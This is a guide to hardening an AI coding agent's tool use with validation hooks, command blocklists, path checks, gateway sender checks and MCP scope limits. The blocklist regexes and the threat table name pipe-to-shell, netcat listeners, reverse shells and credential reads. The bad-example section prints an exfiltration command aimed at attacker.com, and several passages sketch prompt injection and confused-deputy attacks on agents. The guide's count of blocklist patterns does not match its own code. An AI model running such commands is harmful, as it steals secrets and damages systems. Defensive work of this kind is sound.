# OpenClaw Tool Auth: Per-Tool Authorization for Claude Code & OpenClaw

The agent's **allowed-tools list is the last line of defense**. If the Gateway is breached and the Core is tricked, the only thing standing between a prompt-injection payload and `rm -rf /` is the tool authorization layer. This skill implements deterministic, code-level controls that gate every tool call through validation hooks, command blocklists, path restrictions, and sender verification — so the agent can only do what you explicitly permit. [EXPLICIT]

## Principio Rector

**Cada herramienta es un privilegio que se gana, no un derecho que se hereda.** Ningun tool call debe ejecutarse sin pasar por una validacion determinista — el agente propone, el hook dispone.

### Tool Authorization Philosophy

1. **Default-deny, explicit-allow.** Every tool starts blocked. You add permissions one at a time, with documented justification. The `allowed-tools` list in SKILL.md frontmatter and `settings.json` enforces the ceiling; hooks enforce the floor. [EXPLICIT]
2. **Deterministic over heuristic.** Hooks are Python/Bash scripts that return exit codes — not LLM judgments. A blocklisted command is blocked 100% of the time, regardless of context or persuasion. [EXPLICIT]
3. **Hooks are the enforcement layer.** Claude Code's `PreToolUse` and `PostToolUse` hooks are the mechanism. They receive tool name and input via environment variables, validate against rules, and exit 0 (allow) or exit 2 (block). [EXPLICIT]
4. **Personal safety is not optional.** Even single-user deployments need tool auth. You are protecting yourself from prompt injection, supply-chain attacks, and your own future mistakes. [EXPLICIT]

## Inputs

Parse `$ARGUMENTS`: `$1` = project name, `--tools` = comma-separated tool list to authorize. [EXPLICIT]

**Parameters:**
- `{MODO}`: `piloto-auto` (default) | `desatendido` | `supervisado` | `paso-a-paso` [EXPLICIT]
- `{FORMATO}`: `markdown` (default) | `html` | `dual`
- `--tools`: Explicit tool list to authorize (e.g., `bash,read,write,edit`). Default: `read,glob,grep` (read-only). [EXPLICIT]
- `--strict`: Enable maximum restriction mode — blocklist-first for Bash, project-dir-only for files. [EXPLICIT]
- `--audit-only`: Deploy hooks in logging-only mode (no blocking). Useful for migration. [EXPLICIT]

## When to Use

- Implementing PreToolUse hooks to validate Bash commands before execution [EXPLICIT]
- Setting up command blocklists and allowlists for the Terminal/Bash tool [EXPLICIT]
- Restricting file system access to specific directories and blocking sensitive paths [EXPLICIT]
- Authenticating Gateway messages (verifying Telegram chat_id, WhatsApp number, Slack workspace) [EXPLICIT]
- Controlling which MCP tools each agent role can invoke [EXPLICIT]
- Migrating from permissive (`dangerouslySkipPermissions`) to hardened configuration [EXPLICIT]
- Adding audit logging to all tool invocations via PostToolUse hooks [EXPLICIT]

## When NOT to Use

| Need | Use Instead | Why |
|------|-------------|-----|
| Designing overall security architecture | `5022-open-claude-security` | Architecture first, implementation second |
| Docker container isolation | `5023-openclaw-isolation` | Container-level, not tool-level |
| End-to-end personal deployment | `5025-openclaw-personal-deploy` | Orchestrates the full deploy |
| Creating hooks from scratch (generic) | `9038-hook-creator` | Generic hook creation, not security-specific |
| Building OpenClaw agents | `9081-open-claw-builder` | Builds agents; this skill secures their tools |
| General API security design | `5005-api-security` | API-level, not agent-tool-level |

---

## Before Building

Detect existing hook and configuration state:

```
Glob .claude/settings.json .claude/settings.local.json
Glob .claude/hooks/*.py .claude/hooks/*.sh
Glob .mcp.json
Glob CLAUDE.md
```

Load reference materials:

```
Read ${CLAUDE_SKILL_DIR}/references/hook-scripts.md
```

If existing hooks are found, audit them first. If no hooks exist, generate from templates. [EXPLICIT]

---

## Core Process: 5 Sections

### S1: PreToolUse Hook Implementation

PreToolUse hooks intercept every tool call before execution. Claude Code passes the tool name and input via environment variables, the hook script validates, and exits with a code that determines the outcome. [EXPLICIT]

**Hook lifecycle:**

```
Agent decides to call tool
        │
        ▼
┌─────────────────────────┐
│  PreToolUse Hook fires  │
│  ENV: TOOL_NAME         │
│  ENV: TOOL_INPUT (JSON) │
│  Timeout: 5000ms        │
└────────┬────────────────┘
         │
    ┌────┴────┐
    │ Validate │
    └────┬────┘
         │
    ┌────┴─────────────┐
    │                  │
 exit 0             exit 2
 (ALLOW)            (BLOCK)
    │                  │
    ▼                  ▼
 Tool executes    Tool blocked,
                  reason shown
                  to agent
```

**Hook registration in settings.json:**

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "command": "python3 .claude/hooks/validate-bash.py",
        "timeout": 5000
      },
      {
        "matcher": "Read|Write|Edit",
        "command": "python3 .claude/hooks/validate-file-access.py",
        "timeout": 5000
      }
    ],
    "PostToolUse": [
      {
        "command": "python3 .claude/hooks/audit-log.py",
        "timeout": 3000
      }
    ]
  }
}
```

**Exit code contract:**

| Exit Code | Meaning | Agent Behavior |
|-----------|---------|----------------|
| 0 | Allowed | Tool executes normally [EXPLICIT] |
| 1 | Hook error | Tool proceeds (fail-open) — avoid this [EXPLICIT] |
| 2 | Blocked | Tool blocked, stderr shown as reason [EXPLICIT] |

**Critical**: Exit code 1 means hook failure, which is fail-open by default. Always ensure hooks exit 0 or 2, never 1 from validation logic. Handle all exceptions to avoid accidental fail-open. [EXPLICIT]

**Hook script requirements:**
- Read `TOOL_NAME` and `TOOL_INPUT` from environment variables [EXPLICIT]
- Parse `TOOL_INPUT` as JSON [EXPLICIT]
- Validate against rules (blocklist, allowlist, path checks) [EXPLICIT]
- Exit 0 to allow, exit 2 to block [EXPLICIT]
- Write reason to stderr when blocking (agent sees this) [EXPLICIT]
- Complete within timeout (5000ms default) or tool proceeds [EXPLICIT]
- Log all decisions (allow and block) for audit trail [INFERRED]

Minimal validate-bash.py example:

```python
#!/usr/bin/env python3
"""PreToolUse hook: validates Bash commands against blocklist."""
import os, sys, json, re

BLOCKLIST = [
    r'\brm\s+(-[rRf]+\s+)*/',          # rm with absolute paths
    r'\bcurl\b.*\|\s*(sh|bash)',         # pipe-to-shell
    r'\bwget\b.*\|\s*(sh|bash)',         # pipe-to-shell
    r'\bchmod\s+777\b',                  # world-writable
    r'\bsudo\b',                         # privilege escalation
    r'\bdd\s+',                          # disk-level operations
    r'\bmkfs\b',                         # filesystem formatting
    r'\b>\s*/dev/sd',                    # raw device writes
    r'\bnc\s+-l',                        # netcat listeners
    r'dangerouslySkipPermissions',       # self-modification
]

def main():
    tool_input = json.loads(os.environ.get("TOOL_INPUT", "{}"))
    command = tool_input.get("command", "")

    for pattern in BLOCKLIST:
        if re.search(pattern, command, re.IGNORECASE):
            print(f"BLOCKED: command matches blocklist pattern: {pattern}",
                  file=sys.stderr)
            sys.exit(2)

    sys.exit(0)

if __name__ == "__main__":
    main()
```

Full production scripts with logging, allowlists, and edge-case handling are in `references/hook-scripts.md`. [EXPLICIT]

---

### S2: Bash Command Authorization

Bash is the highest-risk tool. A single unvalidated command can exfiltrate data, modify system files, or install malware. Two complementary strategies: **blocklist** (block known-bad patterns) and **allowlist** (allow only known-good patterns). [EXPLICIT]

**Strategy selection:**

| Strategy | Security Level | Usability | When to Use |
|----------|---------------|-----------|-------------|
| Blocklist-only | Medium | High | Development, personal use with trusted inputs [EXPLICIT] |
| Allowlist-only | Very High | Low | CI/CD, restricted agents, high-security [EXPLICIT] |
| Blocklist + Allowlist | High | Medium | Personal OpenClaw with gateway exposure [EXPLICIT] |

**Blocklist categories:**

| Category | Patterns | Severity |
|----------|----------|----------|
| Destructive operations | `rm -rf /`, `mkfs`, `dd if=`, format commands | Critical [EXPLICIT] |
| Privilege escalation | `sudo`, `su -`, `chmod 777`, `chown root` | Critical [EXPLICIT] |
| Network exfiltration | `curl POST`, `wget -O-`, `nc`, `scp`, reverse shells | Critical [EXPLICIT] |
| Pipe-to-shell | `curl|sh`, `wget|bash`, any `|sh` or `|bash` | Critical [EXPLICIT] |
| Self-modification | Edit `.claude/`, modify `settings.json`, change hooks | High [EXPLICIT] |
| Credential access | `cat ~/.ssh/*`, `cat .env`, `printenv` with secrets | High [EXPLICIT] |
| Package installation | `npm install -g`, `pip install`, `apt install` | Medium [INFERRED] |

**Allowlist approach** (for `--strict` mode):

```python
ALLOWLIST = [
    r'^(ls|cat|head|tail|wc|sort|uniq|grep|find|echo)\b',
    r'^git\s+(status|log|diff|branch|show)\b',
    r'^npm\s+(test|run\s+lint|run\s+build)\b',
    r'^python3?\s+.*\.py$',
    r'^node\s+.*\.js$',
]
```

When using allowlist mode, any command not matching an allowlist pattern is blocked by default. This is significantly safer but requires maintaining the allowlist as workflow needs evolve. [EXPLICIT]

**Audit logging for Bash:**

Every Bash command — allowed or blocked — gets logged with timestamp, command text, decision, and matched pattern. This creates an audit trail for incident investigation. Log destination: `.claude/logs/tool-auth.jsonl`. [EXPLICIT]

---

### S3: File System Access Control

File access (Read, Write, Edit) must be restricted to prevent reading secrets, modifying configuration, or accessing files outside the project scope. [EXPLICIT]

**Path authorization rules:**

| Rule | Implementation | Purpose |
|------|---------------|---------|
| Project directory only | Resolve all paths to absolute, verify prefix matches project root | Prevent directory traversal [EXPLICIT] |
| Sensitive file blocking | Block patterns: `.env*`, `*.pem`, `*.key`, `id_rsa*`, `credentials*` | Protect secrets [EXPLICIT] |
| Config protection | Block writes to `.claude/settings*.json`, `.claude/hooks/*` | Prevent self-modification [EXPLICIT] |
| Symlink resolution | Resolve symlinks before path check | Prevent symlink escapes [EXPLICIT] |
| Home directory blocking | Block access to `~/.ssh/`, `~/.aws/`, `~/.gnupg/` | Protect system credentials [EXPLICIT] |

**Path validation logic:**

```python
import os

PROJECT_ROOT = os.path.abspath(os.environ.get("PROJECT_ROOT", os.getcwd()))

BLOCKED_PATTERNS = [
    ".env", ".pem", ".key", "id_rsa", "id_ed25519",
    "credentials", ".aws/", ".ssh/", ".gnupg/",
]

WRITE_PROTECTED = [
    ".claude/settings.json", ".claude/settings.local.json",
    ".claude/hooks/",
]

def validate_path(file_path, is_write=False):
    resolved = os.path.realpath(os.path.abspath(file_path))

    # Must be within project root
    if not resolved.startswith(PROJECT_ROOT):
        return False, f"Outside project root: {resolved}"

    # Check blocked patterns
    for pattern in BLOCKED_PATTERNS:
        if pattern in resolved.lower():
            return False, f"Sensitive file blocked: {pattern}"

    # Write-specific protections
    if is_write:
        rel = os.path.relpath(resolved, PROJECT_ROOT)
        for protected in WRITE_PROTECTED:
            if rel.startswith(protected):
                return False, f"Write-protected path: {protected}"

    return True, "OK"
```

Full implementation with symlink resolution and edge cases in `references/hook-scripts.md`. [EXPLICIT]

### S4: Gateway Authentication

When OpenClaw exposes a Gateway (Telegram bot, WhatsApp adapter, Slack app, HTTP API), every incoming message must be verified before reaching the agent. Without sender verification, anyone who discovers the endpoint can inject prompts. [EXPLICIT]

**Authentication per platform:**

| Platform | Identifier | Verification Method |
|----------|-----------|-------------------|
| Telegram | `chat_id` (integer) | Compare against allowlist of authorized chat IDs [EXPLICIT] |
| WhatsApp | Phone number (E.164) | Compare against allowlist of authorized numbers [EXPLICIT] |
| Slack | `workspace_id` + `user_id` | Verify workspace membership + user allowlist [EXPLICIT] |
| HTTP API | API key or JWT | Validate token against known keys, check expiry [EXPLICIT] |
| Discord | `guild_id` + `user_id` | Server membership + role check [INFERRED] |

**Gateway auth configuration:**

```json
{
  "gateway_auth": {
    "telegram": {
      "allowed_chat_ids": [123456789],
      "reject_unknown": true
    },
    "whatsapp": {
      "allowed_numbers": ["+1234567890"],
      "reject_unknown": true
    },
    "slack": {
      "allowed_workspaces": ["T0123ABCDEF"],
      "allowed_users": ["U0123ABCDEF"],
      "reject_unknown": true
    },
    "http": {
      "auth_type": "bearer",
      "token_env_var": "OPENCLAW_API_TOKEN"
    }
  }
}
```

**Auth flow**: Extract sender identity → check allowlist → match: pass with metadata, no match + `reject_unknown`: drop + log. [EXPLICIT]

**Rate limits**: 10 msg/min, 100 msg/hour, 4096 char max, 60s cooldown on breach. Implementation in `references/hook-scripts.md`. [EXPLICIT]

---

### S5: MCP Scope Authorization

Each MCP server grants the agent access to a set of tools. Without scope controls, an agent with access to a database MCP and a messaging MCP could read your database and send the contents via message — a classic confused-deputy attack. [EXPLICIT]

**MCP scope control strategies:**

| Strategy | Implementation | Security Level |
|----------|---------------|----------------|
| Per-MCP tool allowlist | Only permit specific tools from each MCP server | High [EXPLICIT] |
| Data flow labeling | Tag MCP outputs with sensitivity labels, restrict cross-MCP flow | Very High [INFERRED] |
| Read-only MCP access | Configure MCP to expose only read operations | Medium [EXPLICIT] |
| Single-MCP sessions | Each agent session connects to only one MCP | Very High [EXPLICIT] |

**MCP scope config** — per-server `scope` block with `allowed_tools`, `blocked_tools`, and `data_label`:

```json
{ "filesystem": { "scope": { "allowed_tools": ["read_file", "list_directory"], "blocked_tools": ["write_file"], "data_label": "internal" } },
  "github": { "scope": { "allowed_tools": ["list_issues", "get_issue"], "blocked_tools": ["delete_repo"], "data_label": "public" } } }
```

**Cross-MCP data flow rules:**

| Source Label | Can Flow To | Blocked From |
|-------------|------------|-------------|
| `internal` | Same-label MCPs, local file system | External MCPs, messaging [EXPLICIT] |
| `public` | Any MCP | None [EXPLICIT] |
| `secret` | No MCPs, local encrypted storage only | All MCPs [EXPLICIT] |
| `user-data` | Same-label MCPs with consent | External MCPs, logging [INFERRED] |

**MCP audit requirements:**
- Log every MCP tool invocation with server name, tool name, input size, and timestamp [EXPLICIT]
- Flag cross-label data flows in audit log [INFERRED]
- Alert on blocked tool attempts (possible confused-deputy indicator) [INFERRED]

---

## Assumptions & Limits

**Assumptions:**
- Deployment uses Claude Code hooks system (PreToolUse/PostToolUse with env vars) [EXPLICIT]
- Python 3.8+ available for hook scripts (or Bash as fallback) [EXPLICIT]
- Hook timeout defaults to 5000ms — hooks must complete within this window [EXPLICIT]
- MCP scope controls are enforced at the configuration level, not by MCP servers themselves [INFERRED]
- Gateway adapters expose sender identity fields in their message payloads [EXPLICIT]

**Limits:**
- Hooks are deterministic pattern matchers — they cannot detect semantic intent or novel attack patterns [EXPLICIT]
- Exit code 1 (hook error) is fail-open by default; this is a Claude Code design decision, not configurable [EXPLICIT]
- MCP data flow labels are advisory and enforced at the hook level, not at the MCP transport level [INFERRED]
- Gateway auth depends on platform-provided identity fields — these can be spoofed at the platform API level (but not at the message level for Telegram/WhatsApp) [EXPLICIT]
- This skill implements tool-level controls; container-level isolation requires companion skill `5023-openclaw-isolation` [EXPLICIT]

---

## Edge Cases

1. **User wants to temporarily bypass a hook for debugging.** Never disable hooks by removing them. Instead, set an environment variable `TOOL_AUTH_MODE=audit-only` that switches hooks from blocking (exit 2) to logging-only (exit 0 + log entry). This maintains the audit trail while unblocking the workflow. Remove the env var when done. Document the bypass window in logs. [EXPLICIT]

2. **New tool added to allowed-tools that has no hook coverage.** When adding a tool to `settings.json` permissions, always create or update the corresponding PreToolUse hook matcher. Default behavior for unmatched tools depends on settings: if no hook matches, the tool proceeds without validation. Create a catch-all hook with `"matcher": ".*"` that logs unmatched tool calls and optionally blocks them. [EXPLICIT]

3. **False positive blocking a legitimate command.** The blocklist pattern `rm\s+(-[rRf]+\s+)*/` blocks `rm -rf /tmp/build-cache` even though it is safe. Solutions: (a) add a path-based exception for known-safe directories, (b) use an allowlist entry that overrides the blocklist for specific patterns, (c) log the false positive and refine the regex. Never weaken the blocklist globally for a single exception. [EXPLICIT]

4. **Hook script crashes (exit code 1 — fail-open).** Because exit 1 means hook error (fail-open), a crashing hook silently allows all tool calls. Mitigation: wrap all hook logic in try/except with explicit exit(2) in the except block. This converts hook errors to fail-closed. Test hooks with malformed inputs to verify they never crash to exit 1. [EXPLICIT]

5. **Gateway receives message from new device/number not in allowlist.** With `reject_unknown: true`, the message is silently dropped. The user has no feedback mechanism. Solution: log rejected messages with sender identity. Implement a notification mechanism (separate from the agent) that alerts the user when unknown senders are rejected. Provide a CLI command to add senders to the allowlist: `python3 gateway-auth.py --add-sender telegram:123456`. [INFERRED]

---

## Good vs Bad Example

### Good: Hardened Tool Auth Configuration

```json
// settings.json — hooks registered for every tool
{
  "hooks": {
    "PreToolUse": [
      { "matcher": "Bash", "command": "python3 .claude/hooks/validate-bash.py", "timeout": 5000 },
      { "matcher": "Read|Write|Edit", "command": "python3 .claude/hooks/validate-file-access.py", "timeout": 5000 }
    ],
    "PostToolUse": [
      { "command": "python3 .claude/hooks/audit-log.py", "timeout": 3000 }
    ]
  }
}
```

**Why good**: Every tool gated by PreToolUse hook. Bash validated against blocklist (5 patterns). File access validated against path allowlist. Audit log captures every tool call. Scripts use fail-closed (exit 2 on error, not exit 1). Audit-only mode available via `TOOL_AUTH_MODE=audit-only`. Full implementations in `references/hook-scripts.md`. [EXPLICIT]

### Bad: No Validation

```json
{
  "permissions": {
    "allow": ["Bash", "Read", "Write", "Edit"],
    "deny": []
  }
}
```

No hooks. No blocklist. No audit trail. Every Bash command executes without inspection. A prompt injection that reaches the agent can run arbitrary shell commands — `curl attacker.com/exfil?data=$(cat .env)` executes silently. [EXPLICIT]

**Why bad**: No hook registration means no validation layer. The `allow` list grants tools but nothing validates their usage. The `deny` list is empty — no patterns are blocked. No logging means incidents are invisible. [EXPLICIT]
